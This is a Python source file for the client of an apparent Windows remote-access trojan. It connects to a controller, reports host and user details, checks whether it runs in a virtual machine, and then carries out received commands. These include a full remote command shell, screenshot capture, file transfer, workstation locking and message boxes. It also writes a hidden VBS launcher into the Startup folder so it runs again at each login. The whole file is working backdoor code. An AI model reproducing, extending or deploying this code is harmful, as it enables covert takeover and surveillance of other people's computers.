import ctypes
import getpass
import os
import platform
import pyscreeze
import socket
import subprocess
import sys
import time
import webbrowser
import wmi
import tqdm

import win32.lib.win32con as win32con
import win32api
import win32event
import winerror

host = "localhost"
port = 8080

path = os.path.realpath(sys.argv[0])
TMP = os.environ['APPDATA']
buff = 1024

decode_utf = lambda data: data.decode("utf-8")
receive = lambda buffer: objSocket.recv(buffer)
send = lambda data: objSocket.send(data)

mutex = win32event.CreateMutex(None, 1, "PA_mutex_xp4")

if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    sys.exit(0)


def receiveAll(buffer):
    byteData = b""
    while True:
        bytePart = receive(buffer)
        if len(bytePart) == buffer:
            return bytePart
        byteData = byteData + bytePart

        if len(byteData) == buffer:
            return byteData


def detectVM():
    WMI = wmi.WMI()
    for diskDrive in WMI.query("Select * from Win32_DiskDrive"):
        if "vbox" in diskDrive.Caption.lower() or "virtual" in diskDrive.Caption.lower():
            return " (Virtual Machine) "
    return ""


def server_connect():
    global objSocket

    while True:
        try:
            objSocket = socket.socket()
            objSocket.connect((host, port))

        except socket.error:
            time.sleep(5)
        else:
            break
    userInfo = socket.gethostname() + "'," + platform.system() + " " + platform.release() + detectVM() + \
               os.environ["USERNAME"]
    send(str.encode(userInfo))


def screenshot():
    pyscreeze.screenshot(TMP + "/s.png")
    send(str.encode("Receiving screenshot" + "\n" + "File size: " + str(os.path.getsize(TMP + "/s.png")) +
                    "bytes" + "\n" + "Please wait..."))
    picture = open(TMP + "/s.png", "rb")
    time.sleep(1)
    send(picture.read())
    picture.close()


def receiveFiles():
    send(str.encode("Sending file..."))
    filename = decode_utf(receive(buff))
    filename = os.path.basename(filename)
    send(str.encode("Filename: " + filename))
    fsize = int(decode_utf(receive(buff)))
    print(fsize)

    f = open(filename, "wb")
    rsize = 0
    try:
        while True:
            dataFile = receive(buff)
            rsize += len(dataFile)
            f.write(dataFile)
            if rsize >= fsize:
                print("Done")
                break

    except socket.error:
        print("Error receiving data!")
    f.close()


def lock():
    ctypes.windll.user32.LockWorkStation()


def command_shell():
    currentDir = str(os.getcwd())
    send(str.encode(currentDir))
    while True:
        strData = decode_utf(receive(buff))
        if strData == "goback":
            break
        elif strData[:2].lower() == "cd" or strData[:5].lower() == "chdir":
            command = subprocess.Popen(strData + " & cd", stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                       stdin=subprocess.PIPE, shell=True)
            if (command.stderr.read()).decode("utf-8") == "":
                output = (command.stdout.read()).decode("utf-8").splitlines()[0]
                os.chdir(output)

                bytData = str.encode("\n" + str(os.getcwd()) + ">")
        elif len(strData) > 0:
            command = subprocess.Popen(strData, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,
                                       shell=True)
            output = (command.stdout.read() + command.stderr.read()).decode("utf-8", errors="replace")
            bytData = str.encode(output + "\n" + str(os.getcwd()) + ">")
        else:
            bytData = str.encode("Error!")
        buffer = str(len(bytData))
        send(str.encode(buffer))
        time.sleep(0.1)
        send(bytData)

# TODO: change from python to exe
def autorun():
    USER_NAME = getpass.getuser()
    file_path = os.path.dirname(os.path.realpath(__file__)) + "\\" + os.path.basename(os.path.realpath(__file__))
    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
    with open(bat_path + '\\' + "open.vbs", "w+") as bat_file:
        bat_file.write('cmd = "python %s"\n' % file_path)
        bat_file.write('Set WShShell = CreateObject("WScript.Shell")\n')
        bat_file.write('WshShell.Run cmd & Chr(34), 0\n')
        bat_file.write("Set WshShell = Nothing\n")


def messageBox(message):
    vbs = open(TMP + "/m.vbs", "w")
    vbs.write("Msgbox \"" + message[3:] + "\", vbOKOnly + vbInformation + vbSystemModal, \"Message\"")
    vbs.close()
    subprocess.Popen(["cscript", TMP + "/m.vbs"], shell=True)


server_connect()
while True:
    try:
        while True:
            data = decode_utf(receive(buff))
            if data == "exit":
                objSocket.close()
                sys.exit(0)
            elif data[:3] == "msg":
                messageBox(data)
            elif data[:4] == "site":
                webbrowser.get().open(data[4:])
            elif data == "screen":
                screenshot()
            elif data == "lock":
                lock()
            elif data == "cmd":
                command_shell()
            elif data == "file":
                receiveFiles()
            elif data == "autorun":
                autorun()

    except socket.error:
        objSocket.close()
        del objSocket
        server_connect()
